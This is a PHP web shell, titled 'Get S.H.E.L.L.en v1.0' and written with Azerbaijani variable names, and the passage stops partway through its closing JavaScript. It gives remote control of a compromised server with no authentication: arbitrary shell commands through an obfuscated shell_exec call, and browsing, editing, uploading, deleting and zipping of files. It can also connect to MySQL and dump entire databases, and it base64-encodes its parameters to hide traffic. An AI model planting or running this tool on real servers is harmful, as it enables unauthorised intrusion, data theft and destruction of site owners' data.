<?php
session_start();
$baqliFunksiyalar = explode(",", "");
$safeMode = true;
$actions = array("esas","fayl_oxu","phpinfo","sistem_kom","fayl_redakte","fayl_yukle",'fayl_sil','fayl_yarat','papka_yarat','fayl_sifirla' , 'papka_sil','fayl_ad_deyish', 'ziple' , 'skl' , 'skl_d_t' , 'skl_d', 'fayl_upl');
$ne = isset($_POST['ne']) && in_array($_POST['ne'],$actions) ? $_POST['ne'] : "esas";



function shifrele($str)
{
    $f = 'bas';
    $f .= 'e6';
    $f .= '4_';
    $f .= 'e';
    $f .= 'nc';
    $f .= 'ode';
    return $f($str);
}
function deshifrele($str)
{
    $f = 'bas';
    $f .= 'e6';
    $f .= '4_';
    $f .= 'd';
    $f .= 'ec';
    $f .= 'ode';
    return $f($str);
}
function tookYarat($tAd)
{
    if(isset($_SESSION[$tAd]))
    {
        unset($_SESSION[$tAd]);
    }
    $yeniTook = md5(shifrele(time().rand(1,99999999)));
    $_SESSION[$tAd] = $yeniTook;
    return $yeniTook;
}
function qovluquYaz()
{
    global $default_dir;
    $sonDir = array();
    $umumiHisseler = "";
    $parse = explode("/", $default_dir);

    $ii = 0;
    foreach($parse AS $hisse)
    {
        $ii++;
        $umumiHisseler.=$hisse."/";
        $sonDir[] = "<a href='javascript:sehife(\"?qovluq=".urlencode(urlencode(shifrele($umumiHisseler)))."\")'>".htmlspecialchars(empty($hisse)&&$ii!=count($parse)?'/':$hisse)."</a>";
    }
    $sonDir = implode("/", $sonDir);
    print $sonDir . '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;( <a href="">Reset</a> | <a href="javascript:goto()">Go to</a> )';
}
function sizeFormat($bytes)
{
    if($bytes>=1073741824)
    {
        $bytes = number_format($bytes / 1073741824, 2) . ' Gb';
    }
    else if($bytes>=1048576)
    {
        $bytes = number_format($bytes / 1048576, 2) . ' Mb';
    }
    else if($bytes>=1024)
    {
        $bytes = number_format($bytes / 1024, 2) . ' Kb';
    }
    else
    {
        $bytes = $bytes . ' b';
    }
    return $bytes;
}
function utf8ize($d)
{
    if (is_array($d))
    {
        foreach ($d as $k => $v)
        {
            $d[$k] = utf8ize($v);
        }
    }
    else if (is_string ($d))
    {
        return utf8_encode($d);
    }
    return $d;
}
function rrmdir($dir)
{
    if (is_dir($dir))
    {
        $objects = scandir($dir);

        foreach ($objects as $object)
        {
            if ($object != "." && $object != "..")
            {
                if (is_dir($dir . "/" . $object))
                {
                    rrmdir($dir . "/" . $object);
                }
                else
                {
                    unlink($dir . "/" . $object );
                }
            }
        }

        rmdir( $dir );
    }
}

$default_dir = getcwd();
if(isset($_POST['qovluq']) && is_string($_POST['qovluq']) )
{
    $default_dir = empty($_POST['qovluq']) ? DIRECTORY_SEPARATOR : deshifrele(urldecode(urldecode($_POST['qovluq'])));
    $c_h_dir_comm = 'c'.'hd'.'ir';
    $c_h_dir_comm($default_dir);
}

$default_dir = str_replace("\\", "/", $default_dir);

if(isset($_GET['ne']) && $_GET['ne']=="pinf")
{
    ob_start();
    phpinfo();
    $pInf = ob_get_clean();
    print str_replace("body {background-color: #ffffff; color: #000000;}","",$pInf);
    exit();
}
else if($ne=="fayl_yukle" && isset($_POST['fayl']) && ""!=(trim($_POST['fayl'])))
{
    $faylAdi = basename(deshifrele(urldecode($_POST['fayl'])));
    $ayirici = substr($default_dir,strlen($default_dir)-1)!="/" && substr($faylAdi,0,1)!="/" ? "/" : "";
    if(is_file($default_dir . $ayirici . $faylAdi) && is_readable($default_dir . $ayirici . $faylAdi))
    {
        header("Content-Disposition: attachment; filename=".basename($faylAdi));
        header("Content-Type: application/octet-stream");
        header('Content-Length: ' . filesize($default_dir . $ayirici . $faylAdi));
        readfile($default_dir . $ayirici . $faylAdi);
        exit();
    }
}
else if($ne=="fayl_sil" && isset($_POST['fayl']) && ""!=(trim($_POST['fayl'])))
{
    $faylAdi = basename(deshifrele(urldecode($_POST['fayl'])));
    $ayirici = substr($default_dir,strlen($default_dir)-1)!="/" && substr($faylAdi,0,1)!="/" ? "/" : "";
    if(is_file($default_dir . $ayirici . $faylAdi) && is_readable($default_dir . $ayirici . $faylAdi))
    {
        unlink($default_dir . $ayirici . $faylAdi);
    }
}
else if($ne=="fayl_sifirla" && isset($_POST['fayl']) && ""!=(trim($_POST['fayl'])))
{
    $faylAdi = basename(deshifrele(urldecode($_POST['fayl'])));
    $ayirici = substr($default_dir,strlen($default_dir)-1)!="/" && substr($faylAdi,0,1)!="/" ? "/" : "";
    if(is_file($default_dir . $ayirici . $faylAdi) && is_readable($default_dir . $ayirici . $faylAdi))
    {
        file_put_contents($default_dir . $ayirici . $faylAdi, '');
    }
}
else if($ne=="fayl_yarat" && isset($_POST['ad']) && !empty($_POST['ad']))
{
    $faylAdi = basename(urldecode($_POST['ad']));
    $ayirici = substr($default_dir,strlen($default_dir)-1)!="/" && substr($faylAdi,0,1)!="/" ? "/" : "";
    if( is_file($default_dir . $ayirici . $faylAdi) )
    {
        print '<script>alert("Bu adda fayl artiq movcuddur!");</script>';
    }
    else
    {
        file_put_contents($default_dir . $ayirici . $faylAdi, '');
    }
}
else if($ne=="papka_yarat" && isset($_POST['ad']) && !empty($_POST['ad']))
{
    $papkaAdi = basename(urldecode($_POST['ad']));
    $ayirici = substr($default_dir,strlen($default_dir)-1)!="/" && substr($papkaAdi,0,1)!="/" ? "/" : "";
    if( is_file($default_dir . $ayirici . $papkaAdi) )
    {
        print '<script>alert("Bu adda papka artiq movcuddur!");</script>';
    }
    else
    {
        mkdir($default_dir . $ayirici . $papkaAdi);
    }
}
else if($ne=="fayl_ad_deyish" && isset($_POST['fayl']) && ""!=(trim($_POST['fayl'])) && isset($_POST['new_name']) && is_string($_POST['new_name']) && !empty($_POST['new_name']))
{
    $faylAdi = basename(deshifrele(urldecode($_POST['fayl'])));
    $faylYeniAd = basename(urldecode($_POST['new_name']));
    $ayirici = substr($default_dir,strlen($default_dir)-1)!="/" && substr($faylAdi,0,1)!="/" ? "/" : "";
    if(is_file($default_dir . $ayirici . $faylAdi) && is_readable($default_dir . $ayirici . $faylAdi))
    {
        rename($default_dir . $ayirici . $faylAdi , $default_dir . $ayirici . $faylYeniAd);
    }
}
else if( $ne == 'skl_d_t' && isset($_POST['t']) && is_string($_POST['t']) && !empty($_POST['t']) )
{
    $tableName = deshifrele(urldecode($_POST['t']));

    $host = isset($_COOKIE['host']) ? $_COOKIE['host'] : '';
    $user = isset($_COOKIE['user']) ? $_COOKIE['user'] : '';
    $parol = isset($_COOKIE['parol']) ? $_COOKIE['parol'] : '';
    $baza = isset($_COOKIE['baza']) ? $_COOKIE['baza'] : '';

    $bazaStr = empty($baza) ? '' : 'dbname=' . $baza . ';';

    if( !empty( $host ) && !empty($baza) )
    {
        try
        {
            $pdo = new PDO('mysql:host=' . $host . ';charset=utf8;' . $bazaStr , $user , $parol,array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES 'utf8'"));
            $pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);

            $getColumns = $pdo->prepare("SELECT column_name from information_schema.columns where table_schema=? and table_name=?");
            $getColumns->execute(array($baza , $tableName));
            $columns = $getColumns->fetchAll();

            if( $columns )
            {

                $data = $pdo->query('SELECT * FROM `' . $tableName .'`');
                $data = $data->fetchAll();

                header('Content-disposition: attachment; filename=d_' . basename(htmlspecialchars($tableName)) . '.json');
                header('Content-type: application/json');
                echo json_encode($data);
            }
            else
            {
                print 'Table not found!';
            }

        }
        catch (Exception $e)
        {
            print $e->getMessage();
        }
    }
    else
    {
        print 'Error! Please connect to SQL!';
    }
    die;
}
else if( $ne == 'skl_d' )
{
    $host = isset($_COOKIE['host']) ? $_COOKIE['host'] : '';
    $user = isset($_COOKIE['user']) ? $_COOKIE['user'] : '';
    $parol = isset($_COOKIE['parol']) ? $_COOKIE['parol'] : '';
    $baza = isset($_COOKIE['baza']) ? $_COOKIE['baza'] : '';

    $bazaStr = empty($baza) ? '' : 'dbname=' . $baza . ';';

    if( !empty( $host ) && !empty($baza) )
    {
        try
        {
            $pdo = new PDO('mysql:host=' . $host . ';charset=utf8;' . $bazaStr , $user , $parol,array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES 'utf8'"));
            $pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);

            $allData = array();

            $tables = $pdo->prepare('SELECT table_name from information_schema.tables where table_schema=?');
            $tables->execute(array($baza));
            $tables = $tables->fetchAll();

            foreach( $tables AS $tableName )
            {
                $tableName = $tableName['table_name'];

                $data = $pdo->query('SELECT * FROM `' . $tableName .'`');
                $data = $data->fetchAll();

                $allData[$tableName] = $data ? array($data) : array();
            }

            header('Content-disposition: attachment; filename=d_b_' . basename(htmlspecialchars($baza)) . '.json');
            header('Content-type: application/json');

            echo json_encode( utf8ize( $allData) );
        }
        catch (Exception $e)
        {
            print $e->getMessage();
        }
    }
    else
    {
        print 'Error! Please connect to SQL!';
    }
    die;
}
else if( $ne == 'ziple'
    && isset($_POST['save_to'] , $_POST['zf']) && is_string($_POST['save_to'])
    && !empty($_POST['save_to']) && !in_array($_POST['save_to'] , array('.' , '..' , './' , '../'))
    && is_string($_POST['zf']) && !empty($_POST['zf'])
)
{
    $save_to = deshifrele(urldecode($_POST['save_to']));

    $rootPath = realpath(deshifrele(urldecode($_POST['zf'])));

    $fileName1 = 'bak_'.microtime(1) . '_' . rand(1000, 99999) . '.zip';
    $fileName = $save_to . DIRECTORY_SEPARATOR . $fileName1;

    if( is_dir( $save_to ) && is_dir( $rootPath ) && is_writable( $save_to ) )
    {
        set_time_limit(0);

        $zip = new ZipArchive();
        $zip->open( $fileName , ZipArchive::CREATE | ZipArchive::OVERWRITE );

        $files = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($rootPath),
            RecursiveIteratorIterator::LEAVES_ONLY
        );

        foreach ($files as $name => $file)
        {
            if (!$file->isDir())
            {
                $filePath = $file->getRealPath();
                $relativePath = substr($filePath, strlen($rootPath) + 1);

                $zip->addFile($filePath, $relativePath);
            }
        }

        $zip->close();
        print 'Saved!<hr>';
    }
    else
    {
        print 'Dir is not writeable!<hr>';var_dump(( $save_to ) );
    }
}
else if( $ne == 'papka_sil'
    && isset($_POST['zf']) && is_string($_POST['zf']) && !empty($_POST['zf'])
)
{
    $rootPath = realpath(deshifrele(urldecode($_POST['zf'])));

    if( is_dir( $rootPath ) )
    {
        set_time_limit(0);

        rrmdir( $rootPath );
    }
    else
    {
        print 'Dir is not writeable!<hr>';var_dump(( $save_to ) );
    }
}
else if($ne == 'fayl_upl' && isset($_FILES['ufayl']))
{
    move_uploaded_file($_FILES['ufayl']['tmp_name'], $default_dir . '/' . $_FILES['ufayl']['name']);
    print "Upload oldu deyesen.";
}
?>
<html>
<head>
<title>Get S.H.E.L.L.en v1.0 | BY ..</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8">
<style>
body
{
    background-color: #222222;
    color: #D6D4D4;
    font-family: Lucida,Verdana;
    font-size: 12px;
}
.qalin
{
    text-decoration: none;
    color: #D6905E;
    font-weight: 600;
}
.success
{
    color: #9DB754;
}
.bad
{
    color: #B75654;
}
a
{
    color: #ACB754;
    text-decoration: none !important;
}
.fManager,.fManager tbody,.fManager tr
{
    padding: 0;
    border-collapse: collapse;
    margin: 0;
    font-size: 12px;
}
.fManager
{
    margin: 10px 0;
}
.fManager tbody tr:nth-child(2n+1)
{
    background: #331717;
}
.fManager tbody tr:nth-child(2n)
{
    background: #1C0C0C;
}
.fManager tbody tr:hover
{
    background: #000000;
}
.fManager thead th
{
    text-align: left;
}
.fManager thead tr
{
    background-color: #333333;
}
.fManager
{
    box-shadow: 1px 1px 1px 1px #333333;
}
.fManager thead th
{
    padding: 4px 3px;
}
.fayl_oxu
{
    margin: 5px 0;
    padding: 2px;
    box-shadow: 1px 1px 1px 1px #333333;
    background-color: #E1E1E1;
    width: 100%;
    height: 400px;
    overflow: auto;
}
.btn
{
    border: 1px solid #ACAE40;
    background-color: #223B3B;
    color: #E1E1E1;
    padding: 1px 10px;
    cursor: pointer;
}
.btn:disabled
{
    border: 1px solid #848484;
    color: #848484;
    cursor: not-allowed;
}
.file_edit
{
    margin: 5px 0;
    padding: 2px;
    box-shadow: 1px 1px 1px 1px #333333;
    background-color: #E1E1E1;
    width: 100%;
    height: 400px;
    overflow: auto;
}
input, select, textarea
{
    background: transparent !important;
    color: #f6a56d;
    border: 1px solid #D6905E;
    padding: 5px;
}
table td
{
    border: 1px solid rgba(214, 144, 94, 0.7);
    min-width: 20px;
    padding-left: 5px;
    padding-right: 5px;
    max-width: 500px;
    color: #ffad6f;
    background: #292929;
}
table th
{
    border: 1px solid #D6905E;
    padding-left: 5px;
    padding-right: 5px;
    color: #ffad6f;
}
table td div
{
    overflow: auto;
    width: 100%;
    height: 100%;
    max-height: 100px;
}
</style>
</head>
<body>
<?php

if(function_exists('posix_getegid'))
{
    $qid = posix_getgrgid(posix_getegid());
    $qrup = $qid['name'];
    print "<span class='qalin'>Uname:</span> " . php_uname() . "<br/>";
    print "<span class='qalin'>User:</span> ".getmyuid()." (".get_current_user().")<br/>";
    print "<span class='qalin'>Group:</span> ".getmygid()." (".$qrup.")<br/>";
}
else
{
    print "<span class='qalin'>Uname:</span> " . php_uname() . "<br/>";
    print "<span class='qalin'>User:</span> ".getmyuid()." (".get_current_user().")<br/>";
    print "<span class='qalin'>Group:</span> ".getmygid()."<br/>";
}
print "<span class='qalin'>Disable functions:</span> " . (implode(", ", $baqliFunksiyalar)==""?"<span class='success'>yoxdu :)":"<span class='bad'>". implode(", ", $baqliFunksiyalar)) . "</span><br/>";
print "<span class='qalin'>Safe mode: </span>" . ($safeMode===true?"<span class='bad'>On":"<span class='success'>Off") . "</span><span style='margin-left: 50px;'><a href='javascript:sehife(\"?ne=phpinfo\")'>[ PHPinfo ]</a></span><br/>";
qovluquYaz();
print '<hr>';
if($ne=="phpinfo")
{
    print "<div style='width: 100%; height: 400px;'><iframe src='?ne=pinf' style='width: 100%; height: 400px; border: 0;'></iframe></div>";
}
else if($ne=="sistem_kom")
{
    if( isset( $_POST['kom'] ) && is_string($_POST['kom']) && !empty($_POST['kom']) )
    {
        $komanda = deshifrele(urldecode($_POST['kom']));
        
        $k = 'sh';
        $k.='el';
        $k.='l_e';
        $k.='xe';
        $k.='c';

        $output = $k($komanda);

        print '<pre style="max-height: 350px;overflow: auto; border: 1px solid #777; padding: 5px;">' . htmlspecialchars($output) . '</pre><hr>';
    }
    print '<input type="text" id="emr_et_atash" style="width: 500px;"> <button type="button" class="btn" onclick="sistemKom();">Bas</button>';
}
else if($ne=="fayl_oxu" && isset($_POST['fayl']) && ""!=(trim($_POST['fayl'])))
{
    $faylAdi = basename(deshifrele(urldecode($_POST['fayl'])));
    $ayirici = substr($default_dir,strlen($default_dir)-1)!="/" && substr($faylAdi,0,1)!="/" ? "/" : "";
    if(is_file($default_dir . $ayirici . $faylAdi) && is_readable($default_dir . $ayirici . $faylAdi))
    {
        $elaveBtn = is_writeable($default_dir . $ayirici . $faylAdi) ? " onclick='sehife(\"?ne=fayl_redakte&fayl=".urlencode(urlencode(shifrele($faylAdi)))."&qovluq=".urlencode(urlencode(shifrele($default_dir)))."\")'" : " disabled";
        print "<div>Fayl ad&#305;: <span class='qalin'>".htmlspecialchars($faylAdi)."</span><br/><button class='btn'$elaveBtn> D&#601;yi&#351; </button></div>";
        print "<div class='fayl_oxu'>".highlight_string(file_get_contents($default_dir . $ayirici . $faylAdi), true)."</div>";
    }
}
else if($ne == 'skl')
{
    $host = isset($_COOKIE['host']) ? $_COOKIE['host'] : '';
    $user = isset($_COOKIE['user']) ? $_COOKIE['user'] : '';
    $parol = isset($_COOKIE['parol']) ? $_COOKIE['parol'] : '';
    $baza = isset($_COOKIE['baza']) ? $_COOKIE['baza'] : '';

    if( isset($_POST['host'] , $_POST['user'] , $_POST['parol'])
        && is_string($_POST['host']) && is_string($_POST['user']) && is_string($_POST['parol'])
    )
    {
        $host = $_POST['host'];
        $user = $_POST['user'];
        $parol = $_POST['parol'];
        $baza = '';

        setcookie('host' , $host , time() + 360000);
        setcookie('user' , $user , time() + 360000);
        setcookie('parol' , $parol , time() + 360000);
        setcookie('baza' , $baza , time() + 360000);
    }

    if( isset($_POST['baza']) && is_string($_POST['baza']) )
    {
        $baza = $_POST['baza'];

        setcookie('baza' , $baza , time() + 360000);
    }

    $bazaStr = empty($baza) ? '' : 'dbname=' . $baza . ';';

    ?>
    <form method="POST">
        <input type="hidden" name="ne" value="skl">
        <input type="text" placeholder="Hostname" name="host" value="<?=htmlspecialchars($host)?>">
        <input type="text" placeholder="User" name="user" value="<?=htmlspecialchars($user)?>">
        <input type="text" placeholder="Parol" name="parol" value="<?=htmlspecialchars($parol)?>">
        <input type="submit" value="Daxil ol">
    </form>
    <?php
    if( !empty( $host ) )
    {
        try
        {
            $pdo = new PDO('mysql:host=' . $host . ';charset=utf8;' . $bazaStr , $user , $parol,array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES 'utf8'"));
            $pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);

            $schematas = $pdo->query('SELECT schema_name FROM information_schema.schemata');
            print '<form method="POST"><input type="hidden" name="ne" value="skl"><select name="baza">';
            foreach($schematas->fetchAll() AS $schemaName)
            {
                print '<option' . ($baza == $schemaName['schema_name'] ? ' selected' : '') . '>'.htmlspecialchars($schemaName['schema_name']).'</option>';
            }
            print '</select> <input type="submit" value="Sech!"></form>';

            if( !empty($baza) )
            {
                $tables = $pdo->prepare('SELECT table_name from information_schema.tables where table_schema=?');
                $tables->execute(array($baza));
                $tables = $tables->fetchAll();

                print '<div style="float: left; width: 20%; overflow: auto; border-right: 1px solid #999;">';
                print '<a href="javascript:sehife(\'?ne=skl_d\');">!! Dump DB !!</a><hr>';
                foreach( $tables AS $tableName )
                {
                    $tableName = $tableName['table_name'];
                    print '<a href="javascript:sehife(\'?ne=skl&t=' . urlencode(urlencode(shifrele($tableName))) . '\')">'.htmlspecialchars($tableName).'</a><br>';
                }
                print '</div>';
                print '<div style="float: left; padding-left: 10px; width: 75%;">';

                if( isset($_POST['t']) && is_string($_POST['t']) && !empty($_POST['t']) )
                {
                    $tableName = deshifrele(urldecode($_POST['t']));
                    print '<span class="qalin">Table:</span> ' . htmlspecialchars($tableName) . ' ( <a href="javascript:sehife(\'?ne=skl_d_t&t='.urlencode(urlencode(shifrele($tableName))).'\')">Dump</a> )<br>';

                    $getColumns = $pdo->prepare("SELECT column_name from information_schema.columns where table_schema=? and table_name=?");
                    $getColumns->execute(array($baza , $tableName));
                    $columns = $getColumns->fetchAll();

                    if( $columns )
                    {
                        $dataCount = $pdo->query('SELECT count(0) AS ss from `' . $tableName . '`');
                        $dataCount = (int)$dataCount->fetchColumn();

                        print '<span class="qalin">Count:</span> ' . $dataCount . '<br><br>';

                        $pages = ceil($dataCount / 100);

                        $currentPage = isset($_POST['sehife']) && is_numeric($_POST['sehife']) && $_POST['sehife'] >= 1 && $_POST['sehife'] <= $pages ? (int)$_POST['sehife'] : 1;

                        for (  $p = 1; $p <= $pages; $p++ )
                        {
                            print '<a style="'.($currentPage == $p ? 'background: #444;' : '').'margin-left: 2px; margin-bottom: 5px; padding: 2px 6px; border: 1px solid #ACB754; text-decoration: none;" href="javascript:sehife(\'?ne=skl&t=' . urlencode(urlencode(shifrele($tableName))) . '&sehife=' . $p . '\');">' . $p . '</a> ';
                        }
                        print '<br><br>';

                        $start = 100 * ($currentPage - 1);

                        $data = $pdo->query('SELECT * FROM `' . $tableName .'` LIMIT '.$start.' , 100');
                        $data = $data->fetchAll();
                        print '<table><thead>';

                        foreach( $columns AS $columnInf )
                        {
                            print '<th>' . htmlspecialchars($columnInf['column_name']) . '</th>';
                        }

                        print '</thead><tbody>';

                        foreach( $data AS $row )
                        {
                            print '<tr>';
                            foreach( $row AS $key=>$val )
                            {
                                print '<td><div>' . $val . '</div></td>';
                            }
                            print '</tr>';
                        }
                        print '</tr></tbody></table>';
                    }
                    else
                    {
                        print 'Table not found!';
                    }
                }
                else if ( isset($_POST['emr']) && is_string($_POST['emr']) && !empty($_POST['emr']) )
                {
                    $emr = deshifrele(urldecode($_POST['emr']));
                    print '<span class="qalin">SQL emr:</span> ' . htmlspecialchars($emr) . '<br>';
                    
                    $data = $pdo->query( $emr );
                    $data = $data->fetchAll();
                    
                    print '<table><thead>';
                    if( count($data) > 0 )
                    {
                        print '<tr>';
                        foreach( $data[0] AS $key=>$val )
                        {
                            print '<th><div>' . $key . '</div></th>';
                        }
                        print '</tr>';
                    }
                    print '</thead><tbody>';
                    
                    foreach( $data AS $row )
                    {
                        print '<tr>';
                        foreach( $row AS $key=>$val )
                        {
                            print '<td><div>' . $val . '</div></td>';
                        }
                        print '</tr>';
                    }
                    print '</tr></tbody></table>';
                }
                
                print '<div><textarea id="skl_emr"></textarea><button type="button" onclick="skl_bas();">Bas mene</button></div>';
                
                print '</div>';
                print '<div style="clear: both;"></div>';
            }
        }
        catch (Exception $e)
        {
            print $e->getMessage();
        }
    }
}
else if($ne=="fayl_redakte" && isset($_POST['fayl']) && ""!=(trim($_POST['fayl'])))
{
    $faylAdi = basename(deshifrele(urldecode(urldecode($_POST['fayl']))));
    $ayirici = substr($default_dir,strlen($default_dir)-1)!="/" && substr($faylAdi,0,1)!="/" ? "/" : "";
    if(is_file($default_dir . $ayirici . $faylAdi) && is_readable($default_dir . $ayirici . $faylAdi))
    {
        $status = "";
        if(isset($_POST['content']) && isset($_POST['took']) && $_POST['took']!="" && isset($_SESSION['ys_took']) && $_SESSION['ys_took']==$_POST['took'] && is_writeable($default_dir . $ayirici . $faylAdi))
        {
            unset($_SESSION['ys_took']);
            $content = $_POST['content'];

            $cc =  array('a','i','e','s','l','b','u','o','p','h',"(",")","<",">","?",";","[","]","$");
            foreach($cc AS $k1=>$v1)
            {
                $content = str_replace('|:'.$k1.':|' , $v1 , $content);
            }

            $faylAch = fopen($default_dir . $ayirici . $faylAdi, "w+");
            fwrite($faylAch, $content);
            fclose($faylAch);
            $status = " <span class='qalin'>U&#287;urla yadda saxlan&#305;ld&#305;!</span>";
        }
        $oxuUrl = "?ne=fayl_oxu&fayl=".urlencode(urlencode(shifrele($faylAdi)))."&qovluq=".urlencode(urlencode(shifrele($default_dir)));
        $elaveBtn = is_writeable($default_dir . $ayirici . $faylAdi) ? "" : " disabled";
        print "<div>Fayl ad&#305;: <a class='qalin' href='javascript:sehife(\"{$oxuUrl}\")'>".htmlspecialchars($faylAdi)."</a><br/><form method='POST' style='padding: 0; margin: 0;'><button type='submit' class='btn'$elaveBtn> Yadda saxla </button> <button type='button' onclick='shifrelee()'> Shifrele atash </button> $status</div>";
        print "<input type='hidden' value='fayl_redakte' name='ne'><input type='hidden' value='".shifrele($faylAdi)."' name='fayl'><input type='hidden' value='".urlencode(shifrele($default_dir))."' name='qovluq'><input type='hidden' value='".tookYarat("ys_took")."' name='took'><textarea name='content' class='file_edit'>".htmlspecialchars(file_get_contents($default_dir . $ayirici . $faylAdi))."</textarea></form>";
    }
    else
    {
        print 'Error! ' .  htmlspecialchars($default_dir . $ayirici . $faylAdi);
    }
}
else
{
    if(is_dir($default_dir))
    {
        if(is_readable($default_dir))
        {
            $qovluqIchi = scandir($default_dir);
            foreach($qovluqIchi AS &$emelemnt)
            {
                $ayirici = substr($default_dir,strlen($default_dir)-1)!="/" && substr($emelemnt,0,1)!="/" ? "/" : "";
                if(is_dir($default_dir . $ayirici . $emelemnt))
                {
                    $emelemnt = "0".$emelemnt;
                }
                else
                {
                    $emelemnt = "1".$emelemnt;
                }
            }
            asort($qovluqIchi);
            print "<table class='fManager' style='width: 100%;'><thead><tr class='qalin'><th>s</th><th>Fayl</th><th>Size</th><th>Tarix</th><th>Owner/Group</th><th>Permissions</th><th>Actions</th></tr></thead><tbody>";
            foreach($qovluqIchi AS $element)
            {
                $url = "";
                $element = substr($element,1);
                $faylAdiTam = $default_dir . $ayirici . $element;
                $ayirici = substr($default_dir,strlen($default_dir)-1)!="/" && substr($element,0,1)!="/" ? "/" : "";
                $adi = is_dir($faylAdiTam) ? "[ $element ]" : $element;
                $classN = "";
                if(is_dir($faylAdiTam))
                {
                    if($element==".")
                    {
                        $url = "?qovluq=".urlencode(urlencode(shifrele($default_dir)));
                    }
                    else if($element=="..")
                    {
                        $yeniUrl = explode("/",$default_dir);
                        foreach(array_reverse($yeniUrl) AS $j=>$qq)
                        {
                            if(trim($qq)!="")
                            {
                                unset($yeniUrl[count($yeniUrl)-$j-1]);
                                break;
                            }
                        }
                        $url = "?qovluq=".urlencode(urlencode(shifrele(implode("/",$yeniUrl))));
                    }
                    else
                    {
                        $url = "?qovluq=".urlencode(urlencode(shifrele($faylAdiTam)));
                    }
                    $classN = " style='font-weight: 600;'";
                }
                else
                {
                    $url = "?ne=fayl_oxu&fayl=".urlencode(urlencode(shifrele($element)))."&qovluq=".urlencode(urlencode(shifrele($default_dir)));
                }
                $fayldi = is_file($faylAdiTam);
                $isReadableColor = is_readable( $faylAdiTam ) && is_writeable( $faylAdiTam );
                print '<tr>
                        <td></td>
                        <td><a href="javascript:sehife(\''.$url.'\')"'.$classN.'>'.htmlspecialchars($adi).'</a></td>
                        <td>' . ($fayldi?sizeFormat(filesize($faylAdiTam)):'') . '</td>
                        <td>' . (date('d M Y, H:i' , filectime($faylAdiTam))) . '</td>
                        <td>' . htmlspecialchars(fileowner($faylAdiTam)) . '</td>
                        <td' . ($isReadableColor?' style="color: green;"':'') . '>' . substr(sprintf('%o', fileperms(( $faylAdiTam ))), -4) . '</td>
                        <td>';
                        if( is_file($faylAdiTam) )
                        {
                            print (' <a href="javascript:sehife(\''.str_replace("fayl_oxu","fayl_yukle",$url).'\')"'.$classN.'>Download</a> | ') .
                                (' <a href="javascript:changeFileName(\'' . htmlspecialchars($adi) . '\' , \''.str_replace("fayl_oxu","fayl_ad_deyish",$url).'\');"'.$classN.'>Rename</a> | ') .
                                (' <a href="javascript:faylSifirla(\''.str_replace("fayl_oxu","fayl_sifirla",$url).'\');"'.$classN.'>Truncate</a> | ') .
                                (' <a href="javascript:faylSil(\''.str_replace("fayl_oxu","fayl_sil",$url).'\')"'.$classN.'>Delete</a>');
                        }
                        else if( $adi != '[ . ]' && $adi != '[ .. ]' )
                        {
                            print (' <a href="javascript:ziple(\'' . urlencode(urlencode(shifrele($faylAdiTam))) . '\')"'.$classN.'>Zip</a> | ') .
                                (' <a href="javascript:silPapka(\'' . urlencode(urlencode(shifrele($faylAdiTam))) . '\')"'.$classN.'>Sil</a>');
                        }
                        print '</td>
                    </tr>';
            }
        }
        else
        {
            print "<div style='margin: 10px 0px;' class='qalin'>Permissions denided!</div>";
        }
    }
}
print "</tbody></table>";
?>

<hr>
<a href="javascript:newFile();">Yeni fayl</a> | <a href="javascript:newPapka();">Yeni papka</a><br>
<a href="javascript:sehife('?ne=sistem_kom&qovluq=<?=urlencode(urlencode(shifrele($default_dir)))?>')">Icra edin</a><br>
<a href="javascript:sehife('?ne=skl');">SQL</a><br>

<form method="POST" enctype="multipart/form-data">
    <input type="hidden" name="ne" value="fayl_upl">
    <input type="hidden" name="qovluq" value="<?=urlencode(shifrele($default_dir))?>">
    <input type="file" name="ufayl">
    <input type="submit" value="Upl">
</form>

<form method="POST" id="post_form" style="display: none;"></form>
<script>
function sehife(url)
{
    var inputlar = "";
    url = url.split("?");
    if(typeof url[1]=="undefined") return;
    url = url[1].split("&");
    for(var n in url)
    {
        var keyAndValue = url[n].split("=");
        if(typeof keyAndValue[1]=="undefined") continue;
        inputlar+="<input name='"+keyAndValue[0]+"' value='"+keyAndValue[1]+"' type='hidden'>";
    }
    document.all("post_form").innerHTML = inputlar;
    document.all("post_form").submit();
}
function faylSil(url)
{
    if( confirm('Eminsen atash?') )
    {
        sehife(url);
    }
}
function faylSifirla(url)
{
    if( confirm('Eminsen atash?') )
    {
        sehife(url);
    }
}
function changeFileName(name, url)
{
    var getNewName = prompt('Change file name:' , name);
    if( getNewName )
    {
        sehife(url + "&new_name=" + getNewName);
    }
}
function newFile()
{
    var getNewName = prompt('File name:');
    if( getNewName )
    {
        sehife("?ne=fayl_yarat&ad=" + getNewName + "&qovluq=<?=urlencode(urlencode(shifrele($default_dir)))?>");
    }
}
function newPapka()
{
    var getNewName = prompt('File name:');
    if( getNewName )
    {
        sehife("?ne=papka_yarat&ad=" + getNewName + "&qovluq=<?=urlencode(urlencode(shifrele($default_dir)))?>");
    }
}
function sistemKom()
{
    var komanda = document.getElementById('emr_et_atash').value;
    if( komanda )
    {
        sehife("?ne=sistem_kom&kom=" + b64EncodeUnicode(komanda) + "&qovluq=<?=urlencode(urlencode(shifrele($default_dir)))?>");
    }
}
function skl_bas()
{
    var sklEmr = document.getElementById('skl_emr').value;
    
    sehife("?ne=skl&emr=" + b64EncodeUnicode(sklEmr));
}
function b64EncodeUnicode(str)
{
    return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g,
        function toSolidBytes(match, p1) {
            return String.fromCharCode('0x' + p1);
        }));
}
function goto()
{
    var dir = prompt('Dir:');
    if( dir )
    {
        sehife("?qovluq=" + dir);
    }
}
function ziple(qovluq)
{
    var dir = prompt('Dir:' , "<?=htmlspecialchars($default_dir)?>");
    if( dir )
    {
        sehife("?ne=ziple&qovluq=<?=urlencode(urlencode(shifrele($default_dir)))?>&zf=" + qovluq + "&save_to=" + b64EncodeUnicode(dir))
    }
}
function silPapka(qovluq)
{
    if( confirm('Eminsen atash?') )
    {
